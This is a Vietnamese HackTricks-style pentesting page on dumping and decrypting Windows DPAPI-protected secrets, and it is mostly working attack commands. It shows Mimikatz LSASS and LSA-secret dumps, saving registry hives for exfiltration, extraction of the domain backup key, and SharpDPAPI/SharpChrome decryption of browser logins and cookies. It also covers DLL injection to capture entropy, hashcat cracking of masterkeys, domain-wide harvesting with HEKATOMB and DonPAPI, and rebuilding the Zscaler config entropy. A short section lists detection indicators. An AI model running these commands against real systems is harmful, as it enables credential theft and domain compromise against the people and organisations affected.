# DPAPI - Trích xuất mật khẩu

{{#include ../../banners/hacktricks-training.md}}



## DPAPI là gì

Data Protection API (DPAPI) chủ yếu được sử dụng trong hệ điều hành Windows để **mã hóa đối xứng các khóa riêng bất đối xứng**, tận dụng bí mật của người dùng hoặc hệ thống làm nguồn entropy quan trọng. Cách tiếp cận này giúp đơn giản hóa việc mã hóa cho các nhà phát triển bằng cách cho phép họ mã hóa dữ liệu bằng khóa được tạo từ bí mật đăng nhập của người dùng hoặc, trong trường hợp mã hóa hệ thống, từ bí mật xác thực miền của hệ thống. Nhờ đó, nhà phát triển không cần tự quản lý việc bảo vệ khóa mã hóa.

Cách phổ biến nhất để sử dụng DPAPI là thông qua các hàm **`CryptProtectData` và `CryptUnprotectData`**, cho phép ứng dụng mã hóa và giải mã dữ liệu trong ngữ cảnh bảo mật của tiến trình hiện đang đăng nhập. Theo mặc định, chỉ cùng người dùng hoặc ngữ cảnh hệ thống đã mã hóa dữ liệu mới có thể giải mã dữ liệu đó.<sup>[[2]](#references)[[3]](#references)</sup>

Các hàm này cũng chấp nhận một **tham số entropy tùy chọn** được sử dụng trong quá trình mã hóa và giải mã. Dữ liệu được bảo vệ bằng entropy tùy chọn cần chính giá trị entropy đó để giải mã.<sup>[[2]](#references)[[6]](#references)</sup>

### Tạo khóa người dùng

DPAPI tạo ra một giá trị riêng cho từng người dùng (thường gọi là **pre-key**) từ thông tin xác thực của người dùng. Cách tạo chính xác tùy thuộc vào tài khoản và phiên bản hệ điều hành. Ví dụ, Impacket thử một nhánh HMAC-SHA1 dựa trên giá trị băm SHA-1 của mật khẩu UTF-16LE, một nhánh khác dựa trên giá trị băm MD4/NT của mật khẩu và một nhánh dựa trên PBKDF2-SHA256 dành cho Protected Users. Vì vậy, các công cụ offline thường có thể tạo ra dữ liệu cần thiết từ mật khẩu dạng rõ hoặc giá trị băm NT hiện có.<sup>[[2]](#references)[[10]](#references)</sup>

Điều này đặc biệt đáng chú ý vì nếu kẻ tấn công lấy được giá trị băm mật khẩu của người dùng, họ có thể:

- **Giải mã mọi dữ liệu đã được mã hóa bằng DPAPI** với khóa của người dùng đó mà không cần gọi bất kỳ API nào
- Thử **crack mật khẩu** offline để tạo khóa DPAPI hợp lệ

Thay vì tạo một khóa chính mới cho mỗi blob được bảo vệ, DPAPI duy trì một hoặc nhiều **khóa chính** cho mỗi người dùng. Mỗi khóa chính có một **GUID** (Globally Unique Identifier), và blob đã mã hóa ghi lại khóa chính nào bảo vệ nó.<sup>[[2]](#references)</sup>

Các khóa chính được lưu trong thư mục **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`**, trong đó `{SID}` là Security Identifier của người dùng. Tệp khóa chính chứa dữ liệu được bảo vệ bằng **pre-key** của người dùng và, đối với người dùng miền, dữ liệu khôi phục được bảo vệ bằng **khóa sao lưu miền**.<sup>[[2]](#references)</sup>

Lưu ý rằng **khóa miền dùng để mã hóa khóa chính nằm trên các domain controller và không bao giờ thay đổi**. Vì vậy, nếu kẻ tấn công có quyền truy cập vào domain controller, họ có thể lấy khóa sao lưu miền và giải mã khóa chính của tất cả người dùng trong miền.<sup>[[2]](#references)</sup>

Các blob đã mã hóa chứa **GUID của khóa chính** được dùng để mã hóa dữ liệu bên trong phần header của chúng.

> [!TIP]
> Các blob được mã hóa bằng DPAPI bắt đầu bằng **`01 00 00 00`**

Tìm khóa chính:

```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```

Đây là hình dạng của một loạt Master Key của người dùng:

![What is DPAPI - Users key generation: Đây là hình dạng của một loạt Master Key của người dùng](<../../images/image (1121).png>)

### Tạo khóa Machine/System

Đây là khóa được máy dùng để mã hóa dữ liệu. Khóa này dựa trên **DPAPI_SYSTEM LSA secret**, một khóa đặc biệt mà chỉ người dùng SYSTEM mới có thể truy cập. Khóa này được dùng để mã hóa dữ liệu cần thiết cho chính hệ thống truy cập, chẳng hạn như thông tin xác thực cấp máy hoặc bí mật trên toàn hệ thống.<sup>[[2]](#references)</sup>

Lưu ý rằng các khóa này **không có bản sao lưu trên domain**, nên chỉ có thể truy cập cục bộ:

- **Mimikatz** có thể truy cập khóa này bằng cách dump LSA secret với lệnh: `mimikatz lsadump::secrets`
- Secret được lưu trong registry, vì vậy quản trị viên có thể **sửa quyền DACL để truy cập**. Đường dẫn registry là: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`
- Cũng có thể trích xuất ngoại tuyến từ registry hive. Ví dụ: với quyền quản trị viên trên máy mục tiêu, hãy lưu các hive rồi exfiltrate chúng:

```cmd
reg save HKLM\SYSTEM C:\Windows\Temp\system.hiv
reg save HKLM\SECURITY C:\Windows\Temp\security.hiv
```

Sau đó, trên máy phân tích, khôi phục LSA secret DPAPI_SYSTEM từ các hive và dùng nó để giải mã các DPAPI blob ở phạm vi máy (ví dụ: thông tin xác thực ứng dụng được bảo vệ ở cấp máy hoặc hồ sơ Wi-Fi):

```text
mimikatz lsadump::secrets /system:C:\path\system.hiv /security:C:\path\security.hiv
# Look for the DPAPI_SYSTEM secret in the output
```

Ví dụ DPAPI dành riêng cho Veeam:

{{#ref}}
../../network-services-pentesting/pentesting-veeam-backup-and-replication.md
{{#endref}}

### Dữ liệu được DPAPI bảo vệ

Trong số dữ liệu cá nhân được DPAPI bảo vệ có:

- Thông tin đăng nhập Windows
- Mật khẩu và dữ liệu tự động điền của Internet Explorer và Google Chrome
- Mật khẩu tài khoản e-mail và FTP nội bộ cho các ứng dụng như Outlook và Windows Mail
- Mật khẩu cho thư mục dùng chung, tài nguyên, mạng không dây và Windows Vault, bao gồm cả khóa mã hóa
- Mật khẩu cho kết nối máy tính từ xa, .NET Passport và khóa riêng dùng cho nhiều mục đích mã hóa và xác thực
- Mật khẩu mạng do Credential Manager quản lý và dữ liệu cá nhân trong các ứng dụng sử dụng CryptProtectData, chẳng hạn như Skype, MSN messenger, v.v.
- Các blob được mã hóa bên trong registry
- ...

Dữ liệu được hệ thống bảo vệ bao gồm:
- Mật khẩu Wi-Fi
- ...

Mật khẩu tác vụ đã lên lịch là một vấn đề riêng liên quan đến LSA-secret. Một tác vụ được đăng ký với [Password logon type](https://learn.microsoft.com/en-us/windows/win32/api/taskschd/ne-taskschd-task_logon_type) có thể lưu mật khẩu để khôi phục quyền truy cập local administrator/SYSTEM; tác vụ S4U hoặc dùng interactive-token không chứng minh rằng mật khẩu đã được lưu. Principal và logon type của tác vụ là những dấu hiệu đáng tin cậy hơn tên tài khoản chạy tác vụ.

### Các tùy chọn trích xuất master key

- Nếu người dùng có đặc quyền domain admin, họ có thể truy cập **domain backup key** để giải mã tất cả master key của người dùng trong domain:

```bash
# Mimikatz
lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export

# SharpDPAPI
SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
```

- Với quyền admin cục bộ, có thể **truy cập bộ nhớ LSASS** để trích xuất master key DPAPI của tất cả người dùng đã đăng nhập và key SYSTEM.

```bash
# Mimikatz
mimikatz sekurlsa::dpapi
```

- Nếu người dùng có đặc quyền quản trị viên cục bộ, họ có thể truy cập **bí mật LSA DPAPI_SYSTEM** để giải mã các khóa master của máy:

```bash
# Mimikatz
lsadump::secrets /system:DPAPI_SYSTEM /export
```

- Nếu biết mật khẩu hoặc hash NTLM của người dùng, bạn có thể **giải mã trực tiếp các master key của người dùng**:

```bash
# Mimikatz
dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected

# SharpDPAPI
SharpDPAPI.exe masterkeys /password:PASSWORD
```

- Nếu bạn đang ở trong một session với tư cách người dùng, bạn có thể yêu cầu DC cung cấp **backup key để giải mã các master key bằng RPC**. Nếu bạn là local admin và người dùng đang đăng nhập, bạn có thể **đánh cắp session token của họ** để thực hiện việc này:

```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```


## Liệt kê Vault

```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```

## Truy cập dữ liệu được mã hóa bằng DPAPI

### Tìm dữ liệu được mã hóa bằng DPAPI

Các **tệp được bảo vệ** phổ biến của người dùng nằm trong:

- `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
- Cũng hãy thử thay `\Roaming\` bằng `\Local\` trong các đường dẫn trên.

Ví dụ liệt kê:

```bash
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI) có thể tìm các blob được mã hóa bằng DPAPI trong hệ thống tệp, registry và các blob B64:<sup>[[12]](#references)</sup>

```bash
# Search blobs in the registry
search /type:registry [/path:HKLM] # Search complete registry by default

# Search blobs in folders
search /type:folder /path:C:\path\to\folder
search /type:folder /path:C:\Users\username\AppData\

# Search a blob inside a file
search /type:file /path:C:\path\to\file

# Search a blob inside B64 encoded data
search /type:base64 [/base:<base64 string>]
```

Lưu ý rằng [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI) (từ cùng repo) có thể được dùng để giải mã dữ liệu nhạy cảm như cookie bằng DPAPI.<sup>[[12]](#references)</sup>

#### Công thức nhanh Chromium/Edge/Electron (SharpChrome)

- Người dùng hiện tại, giải mã tương tác thông tin đăng nhập đã lưu/cookie (hoạt động ngay cả với cookie app-bound trên Chrome 127+ vì khóa bổ sung được truy xuất từ Credential Manager của người dùng khi chạy trong ngữ cảnh người dùng):

```cmd
SharpChrome logins  /browser:edge  /unprotect
SharpChrome cookies /browser:chrome /format:csv /unprotect
```

- Phân tích ngoại tuyến khi bạn chỉ có các tệp. Trước tiên, trích xuất khóa trạng thái AES từ "Local State" của profile, sau đó dùng khóa này để giải mã cookie DB:

```cmd
# Dump the AES state key from Local State (DPAPI will be used if running as the user)
SharpChrome statekeys /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Local State" /unprotect
# Copy the hex state key value (e.g., "48F5...AB") and pass it to cookies
SharpChrome cookies /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Cookies" /statekey:48F5...AB /format:json
```

- Rà soát từ xa trên toàn domain khi bạn có khóa backup DPAPI của domain (PVK) và quyền admin trên máy đích:

```cmd
SharpChrome cookies /server:HOST01 /browser:edge /pvk:BASE64
SharpChrome logins  /server:HOST01 /browser:chrome /pvk:key.pvk
```

- Nếu bạn có DPAPI prekey/credkey của người dùng (lấy từ LSASS), bạn có thể bỏ qua việc crack mật khẩu và giải mã trực tiếp dữ liệu hồ sơ:

```cmd
# For SharpChrome use /prekey; for SharpDPAPI use /credkey
SharpChrome cookies /browser:edge /prekey:SHA1_HEX
SharpDPAPI.exe credentials /credkey:SHA1_HEX
```

Ghi chú
- Các bản dựng Chrome/Edge mới hơn có thể lưu một số cookie bằng mã hóa "App-Bound". Không thể giải mã ngoại tuyến các cookie cụ thể đó nếu không có khóa app-bound bổ sung; hãy chạy SharpChrome trong ngữ cảnh người dùng mục tiêu để tự động lấy khóa này. Xem bài đăng blog bảo mật Chrome được dẫn bên dưới.<sup>[[5]](#references)</sup>

### Khóa truy cập và dữ liệu

- **Sử dụng SharpDPAPI** để lấy thông tin xác thực từ các tệp được mã hóa bằng DPAPI trong phiên hiện tại:

```bash
# Decrypt user data
## Note that 'triage' is like running credentials, vaults, rdg and certificates
SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect

# Decrypt machine data
SharpDPAPI.exe machinetriage 
```

- **Lấy thông tin xác thực** như dữ liệu được mã hóa và guidMasterKey.<sup>[[3]](#references)</sup>

```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```

- **Truy cập masterkeys**:

Giải mã masterkey của người dùng bằng cách yêu cầu **domain backup key** qua RPC:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```

Công cụ **SharpDPAPI** cũng hỗ trợ các đối số này để giải mã masterkey (lưu ý có thể dùng `/rpc` để lấy khóa sao lưu của domain, `/password` để dùng mật khẩu dạng plaintext hoặc `/pvk` để chỉ định tệp khóa riêng DPAPI của domain...):<sup>[[12]](#references)</sup>

```
/target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
/pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
/server:SERVER          -   triage a remote server, assuming admin access
/hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
```

- **Giải mã dữ liệu bằng masterkey**:

```bash
# Mimikatz
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>

# SharpDPAPI
SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
```

Công cụ **SharpDPAPI** cũng hỗ trợ các đối số này để giải mã `credentials|vaults|rdg|keepass|triage|blob|ps` (lưu ý có thể dùng `/rpc` để lấy khóa sao lưu của domain, `/password` để dùng mật khẩu dạng văn bản thuần, `/pvk` để chỉ định tệp khóa riêng DPAPI của domain, `/unprotect` để dùng phiên của người dùng hiện tại...):<sup>[[12]](#references)</sup>

```
Decryption:
/unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
/pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
/mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption

Targeting:
/target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
/server:SERVER      -   triage a remote server, assuming admin access
                        Note: must use with /pvk:KEY or /password:X
                        Note: not applicable to 'blob' or 'ps' commands
```

- Sử dụng trực tiếp DPAPI prekey/credkey (không cần mật khẩu)

Nếu có thể dump LSASS, Mimikatz thường hiển thị một DPAPI key riêng cho mỗi phiên đăng nhập, có thể dùng để giải mã masterkeys của người dùng mà không cần biết mật khẩu dạng plaintext. Truyền trực tiếp giá trị này cho công cụ:

```cmd
# SharpDPAPI accepts the "credkey" (domain or local SHA1)
SharpDPAPI.exe triage /credkey:SHA1_HEX

# SharpChrome accepts the same value as a "prekey"
SharpChrome logins /browser:edge /prekey:SHA1_HEX
```


- Giải mã một số dữ liệu bằng **phiên người dùng hiện tại**:

```bash
# Mimikatz
dpapi::blob /in:C:\path\to\encrypted\file /unprotect

# SharpDPAPI
SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
```

---

### Giải mã offline bằng Impacket dpapi.py

Nếu có SID và mật khẩu (hoặc NT hash) của người dùng nạn nhân, bạn có thể giải mã các masterkey DPAPI và blob Credential Manager hoàn toàn offline bằng Impacket’s dpapi.py.<sup>[[10]](#references)[[11]](#references)</sup>

- Xác định các artefact trên đĩa:
  - Blob Credential Manager: %APPDATA%\Microsoft\Credentials\<hex>
  - Masterkey tương ứng: %APPDATA%\Microsoft\Protect\<SID>\{GUID}

- Nếu công cụ truyền tệp không ổn định, hãy chuyển các tệp thành base64 trên máy chủ rồi sao chép kết quả:

```powershell
# Base64-encode files for copy/paste exfil
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Credentials\C8D69E...B9"))
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Protect\<SID>\556a2412-1275-4ccf-b721-e6a0b4f90407"))
```

- Giải mã masterkey bằng SID và mật khẩu/hash của người dùng:

```bash
# Plaintext password
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
  -sid S-1-5-21-1111-2222-3333-1107 -password 'UserPassword!'

# Or with NT hash
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
  -sid S-1-5-21-1111-2222-3333-1107 -key 0x<NTLM_HEX>
```

- Sử dụng masterkey đã giải mã để giải mã credential blob:

```bash
python3 dpapi.py credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0x<MASTERKEY_HEX>
# Expect output like: Type=CRED_TYPE_DOMAIN_PASSWORD; Target=Domain:target=DOMAIN
# Username=<user> ; Password=<cleartext>
```

Quy trình này thường khôi phục được thông tin xác thực domain do các ứng dụng lưu bằng Windows Credential Manager, bao gồm cả tài khoản quản trị (ví dụ: `*_adm`).

---

### Xử lý entropy tùy chọn ("Third-party entropy")

Một số ứng dụng truyền thêm giá trị **entropy** cho `CryptProtectData`. Nếu thiếu giá trị này, không thể giải mã blob, ngay cả khi đã biết đúng masterkey. Vì vậy, cần thu thập entropy khi nhắm đến thông tin xác thực được bảo vệ theo cách này (ví dụ: Microsoft Outlook, một số VPN client).

[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture) (2022) là một DLL chạy ở user-mode, hook các hàm DPAPI bên trong tiến trình mục tiêu và ghi lại một cách minh bạch mọi entropy tùy chọn được truyền vào. Chạy EntropyCapture ở chế độ **DLL-injection** nhắm vào các tiến trình như `outlook.exe` hoặc `vpnclient.exe` sẽ tạo ra một tệp ánh xạ từng bộ đệm entropy với tiến trình gọi và blob. Sau đó, có thể cung cấp entropy đã thu thập cho **SharpDPAPI** (`/entropy:`) hoặc **Mimikatz** (`/entropy:<file>`) để giải mã dữ liệu.<sup>[[6]](#references)</sup>

```powershell
# Inject EntropyCapture into the current user's Outlook
InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll

# Later decrypt a credential blob that required entropy
SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
```


### Cracking masterkeys offline (Hashcat & DPAPISnoop)

Microsoft giới thiệu định dạng masterkey **context 3** bắt đầu từ Windows 10 v1607 (2016). `hashcat` v6.2.6 (tháng 12 năm 2023) bổ sung các hash-mode **22100** (DPAPI masterkey v1 context ), **22101** (context 1) và **22102** (context 3), cho phép cracking mật khẩu người dùng trực tiếp từ file masterkey bằng GPU. Vì vậy, kẻ tấn công có thể thực hiện các cuộc tấn công word-list hoặc brute-force mà không cần tương tác với hệ thống mục tiêu.<sup>[[7]](#references)</sup>

`DPAPISnoop` (2024) tự động hóa quy trình này:

```bash
# Parse a whole Protect folder, generate hashcat format and crack
DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
hashcat -m 22102 bob.hc wordlist.txt -O -w4
```

Công cụ cũng có thể phân tích các blob Credential và Vault, giải mã chúng bằng các khóa đã crack và xuất mật khẩu dạng plaintext.<sup>[[8]](#references)</sup>


### Truy cập dữ liệu của máy khác

Trong **SharpDPAPI và SharpChrome**, bạn có thể chỉ định tùy chọn **`/server:HOST`** để truy cập dữ liệu của máy từ xa. Tất nhiên, bạn cần có quyền truy cập vào máy đó và ví dụ sau giả định rằng **khóa mã hóa sao lưu của domain đã được biết**:

```bash
SharpDPAPI.exe triage /server:HOST /pvk:BASE64
SharpChrome cookies /server:HOST /pvk:BASE64
```

## Các công cụ khác

### HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) là công cụ tự động trích xuất tất cả người dùng và máy tính từ thư mục LDAP, đồng thời trích xuất khóa sao lưu của domain controller qua RPC. Sau đó, script sẽ phân giải địa chỉ IP của tất cả máy tính, chạy smbclient trên từng máy để lấy tất cả DPAPI blobs của người dùng và giải mã mọi thứ bằng khóa sao lưu domain.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

Danh sách máy tính trích xuất từ LDAP có thể giúp bạn tìm thấy mọi mạng con, ngay cả khi trước đó bạn không biết chúng tồn tại!

### DonPAPI 2.x (2024-05)

[**DonPAPI**](https://github.com/login-securite/DonPAPI) có thể tự động dump các secret được DPAPI bảo vệ. Bản phát hành 2.x bổ sung:<sup>[[9]](#references)</sup>

* Thu thập blob song song từ hàng trăm host
* Phân tích masterkeys **context 3** và tích hợp tự động việc crack bằng Hashcat
* Hỗ trợ cookie được mã hóa bằng tính năng "App-Bound" của Chrome (xem phần tiếp theo)
* Chế độ **`--snapshot`** mới để liên tục thăm dò endpoint và so sánh các blob mới được tạo

### DPAPISnoop

[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) là trình phân tích cú pháp C# cho các tệp masterkey/credential/vault, có thể xuất định dạng Hashcat/JtR và tùy chọn tự động gọi công cụ crack. Công cụ hỗ trợ đầy đủ định dạng masterkey của máy và người dùng cho đến Windows 11 24H1.<sup>[[8]](#references)</sup>


## Các dấu hiệu phát hiện phổ biến

- Truy cập các tệp trong `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`, `C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` và các thư mục liên quan đến DPAPI khác.
    - Đặc biệt là truy cập từ network share như **C$** hoặc **ADMIN$**.
- Sử dụng **Mimikatz**, **SharpDPAPI** hoặc công cụ tương tự để truy cập bộ nhớ LSASS hoặc dump masterkeys.
- Sự kiện **4662**: *An operation was performed on an object* – có thể được đối chiếu với việc truy cập đối tượng **`BCKUPKEY`**.
- Sự kiện **4673/4674** khi một tiến trình yêu cầu *SeTrustedCredManAccessPrivilege* (Credential Manager)

---
### Lỗ hổng và thay đổi hệ sinh thái giai đoạn 2023-2025

* **CVE-2023-36004 – giả mạo Secure Channel của Windows DPAPI** (tháng 11 năm 2023). Kẻ tấn công có quyền truy cập mạng có thể lừa một máy thuộc domain truy xuất khóa sao lưu DPAPI độc hại, cho phép giải mã masterkeys của người dùng. Lỗ hổng đã được vá trong bản cập nhật tích lũy tháng 11 năm 2023 – quản trị viên nên đảm bảo DC và máy trạm đã được cập nhật đầy đủ.<sup>[[4]](#references)</sup>
* **Mã hóa cookie “App-Bound” của Chrome 127** (tháng 7 năm 2024) thay thế cơ chế bảo vệ cũ chỉ dùng DPAPI bằng một khóa bổ sung được lưu trong **Credential Manager** của người dùng. Giờ đây, để giải mã cookie ngoại tuyến cần cả masterkey DPAPI và **khóa app-bound được bọc bằng GCM**. SharpChrome v2.3 và DonPAPI 2.x có thể khôi phục khóa bổ sung khi chạy trong ngữ cảnh người dùng.<sup>[[5]](#references)</sup>


### Nghiên cứu tình huống: Zscaler Client Connector – Entropy tùy chỉnh được tạo từ SID

Zscaler Client Connector lưu một số tệp cấu hình trong `C:\ProgramData\Zscaler` (ví dụ: `config.dat`, `users.dat`, `*.ztc`, `*.mtt`, `*.mtc`, `*.mtp`). Mỗi tệp được mã hóa bằng **DPAPI (Machine scope)**, nhưng nhà cung cấp sử dụng **entropy tùy chỉnh** được *tính toán trong lúc chạy* thay vì lưu trên đĩa.<sup>[[1]](#references)</sup>

Entropy được dựng lại từ hai thành phần:

1. Một secret hard-code được nhúng trong `ZSACredentialProvider.dll`.
2. **SID** của tài khoản Windows sở hữu cấu hình.

Thuật toán do DLL triển khai tương đương với:

```csharp
byte[] secret = Encoding.UTF8.GetBytes(HARDCODED_SECRET);
byte[] sid    = Encoding.UTF8.GetBytes(CurrentUserSID);

// XOR the two buffers byte-by-byte
byte[] tmp = new byte[secret.Length];
for (int i = 0; i < secret.Length; i++)
    tmp[i] = (byte)(sid[i] ^ secret[i]);

// Split in half and XOR both halves together to create the final entropy buffer
byte[] entropy = new byte[tmp.Length / 2];
for (int i = 0; i < entropy.Length; i++)
    entropy[i] = (byte)(tmp[i] ^ tmp[i + entropy.Length]);
```

Vì secret được nhúng trong một DLL có thể đọc từ đĩa, **bất kỳ attacker cục bộ nào có quyền SYSTEM đều có thể tạo lại entropy cho bất kỳ SID nào** và giải mã các blob offline:

```csharp
byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
Console.WriteLine(Encoding.UTF8.GetString(clear));
```

Giải mã sẽ thu được toàn bộ cấu hình JSON, bao gồm mọi **kiểm tra trạng thái thiết bị** và giá trị mong đợi của chúng – thông tin rất hữu ích khi tìm cách bypass phía client.

> TIP: các artefact được mã hóa khác (`*.mtt`, `*.mtp`, `*.mtc`, `*.ztc`) được bảo vệ bằng DPAPI **không có** entropy (`16` byte 0). Vì vậy, có thể giải mã trực tiếp chúng bằng `ProtectedData.Unprotect` sau khi có được quyền SYSTEM.

## References

- [1] [Synacktiv – Có nên tin vào zero trust? Bypass kiểm tra trạng thái Zscaler](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [2] [Bí mật DPAPI. Phân tích bảo mật và khôi phục dữ liệu trong DPAPI](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [3] [Đọc bí mật được mã hóa bằng DPAPI với Mimikatz và C++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
- [4] [CVE-2023-36004 - Lỗ hổng giả mạo Windows DPAPI (Data Protection Application Programming Interface)](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004)
- [5] [Cải thiện bảo mật cookie Chrome trên Windows](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
- [6] [EntropyCapture: Trích xuất entropy tùy chọn của DPAPI đơn giản](https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/)
- [7] [Ghi chú phát hành hashcat v6.2.6](https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6)
- [8] [DPAPISnoop – kho GitHub](https://github.com/Leftp/DPAPISnoop)
- [9] [DonPAPI 2.0.1 – trang dự án PyPI](https://pypi.org/project/donpapi/2.0.0/)
- [10] [Impacket – dpapi.py](https://github.com/fortra/impacket)
- [11] [HTB Puppy: Lạm dụng AD ACL, crack Argon2 của KeePassXC và giải mã DPAPI để chiếm quyền admin DC](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [12] [GhostPack SharpDPAPI/SharpChrome – Cách dùng và tùy chọn](https://github.com/GhostPack/SharpDPAPI)
{{#include ../../banners/hacktricks-training.md}}
